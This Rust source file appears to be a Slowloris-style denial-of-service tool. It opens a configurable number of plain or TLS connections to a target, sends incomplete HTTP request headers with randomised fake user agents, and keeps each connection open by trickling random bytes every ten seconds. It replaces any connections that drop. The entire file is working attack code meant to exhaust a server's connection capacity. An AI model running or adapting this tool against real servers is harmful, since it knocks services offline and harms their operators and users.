/*
Copyright (c) 2021 trivernis
See LICENSE for more information
 */
use native_tls::TlsConnector;
use rayon::prelude::*;
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;
use structopt::StructOpt;

#[derive(StructOpt, Debug)]
#[structopt()]
struct Opt {
    /// The target address with port
    #[structopt()]
    pub address: String,

    // The port to connect to
    #[structopt(short, long, default_value = "443")]
    pub port: u32,

    /// If the connection should use plain http
    #[structopt(short, long)]
    pub http: bool,

    /// Number of connections
    #[structopt(short = "n", long, default_value = "200")]
    pub count: usize,
}

fn main() {
    let opts: Opt = Opt::from_args();
    let mut connections = create_connections(&*opts.address, opts.port, opts.count, !opts.http);
    println!("Created {} connections", connections.len());

    loop {
        thread::sleep(Duration::from_secs(10));
        println!(r#"Sending "Keep-Alive" Headers"#);
        let mut new_connections = Vec::new();

        for mut connection in connections {
            if let Ok(_) = connection.write_all(&[rand::random::<u8>()]) {
                new_connections.push(connection);
            }
        }
        connections = new_connections;

        if connections.len() < opts.count {
            let mut more_connections = create_connections(
                &*opts.address,
                opts.port,
                opts.count - connections.len(),
                !opts.http,
            );
            connections.append(&mut more_connections);
        }

        println!("Connection count: {}", connections.len())
    }
}

/// Creates connections
fn create_connections(
    address: &str,
    port: u32,
    count: usize,
    https: bool,
) -> Vec<Box<dyn Write + Send + Sync>> {
    return (0..count)
        .par_bridge()
        .filter_map(|_| create_connection(address, port, https))
        .collect();
}

/// Creates a single connection yo
fn create_connection(
    address: &str,
    port: u32,
    https: bool,
) -> Option<Box<dyn Write + Send + Sync>> {
    let tcp_stream = TcpStream::connect(format!("{}:{}", address, port))
        .map_err(|e| {
            eprint!("Failed to establish connection: {}", e);
            e
        })
        .ok()?;

    let mut stream: Box<dyn Write + Send + Sync> = if https {
        let connector = TlsConnector::new().unwrap();
        let tls_stream = connector.connect(&*address.clone(), tcp_stream).unwrap();
        Box::new(tls_stream)
    } else {
        Box::new(tcp_stream)
    };

    stream.write_all(b"GET / HTTP/1.1\r\n").ok()?;
    stream
        .write_all(format!("User-Agent: {}\r\n", fakeit::user_agent::random_platform()).as_bytes())
        .ok()?;
    stream.write_all(b"X-a: {}\r\n").ok()?;

    Some(stream)
}
